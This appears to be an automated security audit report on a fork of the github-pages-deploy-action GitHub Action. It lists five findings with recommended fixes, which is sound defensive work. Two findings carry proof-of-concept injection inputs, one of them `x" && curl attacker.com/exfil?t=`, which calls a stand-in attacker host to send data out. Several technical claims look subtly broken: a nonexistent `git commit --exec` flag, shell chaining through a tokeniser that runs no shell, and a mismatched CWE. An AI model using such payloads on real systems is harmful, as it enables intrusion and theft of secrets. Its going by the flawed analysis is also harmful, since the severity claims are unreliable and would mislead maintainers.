# Security Scout Report

**Date:** 2026-05-05
**Run Type:** initial
**Target:** safeengineauto/github-pages-deploy-action (JamesIves/github-pages-deploy-action fork)
**Version Analyzed:** 4.8.0 (commit `8072b9c7`)
**Analyst:** OSS Security Scout (automated)

---

## Executive Summary

Five security issues were identified in the `github-pages-deploy-action` GitHub Action codebase. The most critical findings involve command injection vectors where user-controlled workflow inputs are interpolated directly into shell command strings constructed within the TypeScript source. A secondary concern involves a shared mutable object causing a race condition in the command executor, and partial secret masking that leaves certain sensitive values exposed in error logs.

---

## Findings

### FINDING-001 — Command Injection via Unsanitized `commit-message` Input

**Severity:** High
**File:** `src/git.ts`, line 255
**CWE:** CWE-78 (OS Command Injection)

**Description:**
The `commit-message` action input is interpolated directly into a shell command string that is passed to `@actions/exec`:

```typescript
`git commit -m "${commitMessage}" --quiet --no-verify`
```

`@actions/exec`'s `exec()` function calls `argStringToArray()` on the entire command string before execution. This tokenizer respects shell quoting, meaning a crafted value containing a closing double-quote followed by additional tokens can break out of the `-m "..."` argument and inject arbitrary git flags or, via `--exec`, arbitrary commands.

**Proof-of-Concept Input:**
```
legitimate message" --exec=malicious-script
```
This would cause the constructed string to become:
```
git commit -m "legitimate message" --exec=malicious-script --quiet --no-verify
```

**Recommended Fix:**
Pass `commitMessage` as a separate element in the `args` array rather than embedding it in the command string:
```typescript
await exec('git', ['commit', '-m', commitMessage, '--quiet', '--no-verify'], { cwd, silent })
```
This bypasses shell tokenization entirely, as `@actions/exec` passes individual array items directly to `execvp()`.

---

### FINDING-002 — Command Injection via `git-config-name` and `git-config-email` Inputs

**Severity:** High
**File:** `src/git.ts`, lines 41–50
**CWE:** CWE-78 (OS Command Injection)

**Description:**
The `git-config-name` and `git-config-email` action inputs are interpolated directly into git command strings:

```typescript
`git config user.name "${action.name}"`
`git config user.email "${action.email}"`
```

An actor who controls the workflow invocation (e.g., via `workflow_dispatch` or by exploiting a pull-request-triggered workflow that sets these inputs from PR context) can craft values that break the double-quoted argument boundary. For example, a name of `x" && curl attacker.com/exfil?t=` followed by a second shell command would be tokenized by `argStringToArray` and the extra tokens appended to the command arguments. While git config itself is unlikely to execute shell commands via argument injection, this can be used to set unexpected git configuration values (e.g., `core.hooksPath`, `credential.helper`) by injecting additional `git config` key/value pairs via shell command chaining if the runner shell is invoked.

**Recommended Fix:**
Use the separate `args` array form:
```typescript
await exec('git', ['config', 'user.name', action.name], { cwd, silent })
await exec('git', ['config', 'user.email', action.email], { cwd, silent })
```

---

### FINDING-003 — Async SSH Key Loading Not Awaited (Logic/Security Bug)

**Severity:** Medium
**File:** `src/ssh.ts`, lines 41–43
**CWE:** CWE-362 (Race Condition), CWE-295 (Improper Certificate Validation)

**Description:**
The SSH key loading loop uses `.map(async ...)` but does not await the resulting array of Promises:

```typescript
action.sshKey.split(/(?=-----BEGIN)/).map(async line => {
  execSync('ssh-add -', {input: `${line.trim()}\n`})
})
```

The `.map()` call returns an array of Promises, none of which are awaited. In practice this works incidentally for synchronous `execSync` calls, but the `async` wrapper means any thrown exception inside the callback is silently swallowed as an unhandled promise rejection. If a malformed or split key segment fails to load into the agent, `ssh-add -l` on line 45 will succeed (listing any previously loaded keys) and the action will appear to have configured SSH correctly when it has not.

The immediate security implication is that a partially-loaded key (e.g., the last fragment of a multi-certificate key chain) silently fails, potentially degrading to no-auth or a weaker authentication state without raising an error.

**Recommended Fix:**
```typescript
await Promise.all(
  action.sshKey.split(/(?=-----BEGIN)/).map(async line => {
    execSync('ssh-add -', {input: `${line.trim()}\n`})
  })
)
```

---

### FINDING-004 — Shared Mutable State in `execute()` Causes Race Condition

**Severity:** Medium
**File:** `src/execute.ts`, lines 18–46
**CWE:** CWE-362 (Concurrent Execution Using Shared Resource with Improper Synchronization)

**Description:**
The `execute.ts` module declares a single module-level `output` object shared across all invocations:

```typescript
const output: ExecuteOutput = {stdout: '', stderr: ''}
```

Every call to `execute()` resets and reuses this same object. If two `execute()` calls are in-flight concurrently (e.g., triggered by different async paths or in tests), their stdout/stderr data will be interleaved in the shared object. This means:

1. Output from one command may be attributed to another, causing incorrect branch-existence checks (`branchExists`) or file-change detection (`hasFilesToCommit`) — both of which gate whether deployment proceeds.
2. In a scenario where a race causes `branchExists` to appear `false` when it is actually `true`, the action will create an orphan branch wiping existing deployment history.

**Recommended Fix:**
Allocate a fresh output object per call:
```typescript
export async function execute(
  cmd: string,
  cwd: string,
  silent: boolean,
  ignoreReturnCode: boolean = false
): Promise<ExecuteOutput> {
  const output: ExecuteOutput = {stdout: '', stderr: ''}
  // ...
}
```

---

### FINDING-005 — Incomplete Secret Suppression in Error Messages

**Severity:** Low
**File:** `src/util.ts`, lines 107–127
**CWE:** CWE-532 (Insertion of Sensitive Information into Log File)

**Description:**
The `suppressSensitiveInformation()` function only masks `action.token` and `action.repositoryPath`:

```typescript
const orderedByLength = (
  [action.token, action.repositoryPath].filter(Boolean) as string[]
).sort((a, b) => b.length - a.length)
```

Other sensitive values that may appear in error messages include:
- `action.sshKey` — the raw private SSH key string
- `action.name` and `action.email` — may contain PII
- Git credentials embedded in error output from git commands

If an exception is thrown during SSH configuration or deployment and the error message contains a fragment of the SSH private key (e.g., from a failed `execSync`), that key fragment will be logged in plain text to the Actions run log, which may be accessible to anyone with read access to the repository.

**Recommended Fix:**
Extend the suppression list:
```typescript
const orderedByLength = (
  [action.token, action.repositoryPath, typeof action.sshKey === 'string' ? action.sshKey : undefined]
    .filter(Boolean) as string[]
).sort((a, b) => b.length - a.length)
```

---

## Summary Table

| ID | Title | Severity | File | CWE |
|----|-------|----------|------|-----|
| FINDING-001 | Command injection via `commit-message` input | High | `src/git.ts:255` | CWE-78 |
| FINDING-002 | Command injection via `git-config-name`/`git-config-email` | High | `src/git.ts:41-50` | CWE-78 |
| FINDING-003 | Async SSH key loading not awaited | Medium | `src/ssh.ts:41-43` | CWE-362, CWE-295 |
| FINDING-004 | Shared mutable state race condition in `execute()` | Medium | `src/execute.ts:18` | CWE-362 |
| FINDING-005 | Incomplete secret suppression in error messages | Low | `src/util.ts:107-127` | CWE-532 |

---

## Scope & Methodology

- Static code analysis of all TypeScript source files under `src/`
- Review of `action.yml` inputs and their propagation through the codebase
- Review of `.github/workflows/` workflow definitions
- Evaluation of `@actions/exec` command parsing behavior (`argStringToArray`)
- No dynamic/runtime testing was performed

---

## Out of Scope

- Transitive npm dependency vulnerabilities (recommend running `npm audit`)
- Integration-test harness under `integration/`
- Compiled output under `lib/`
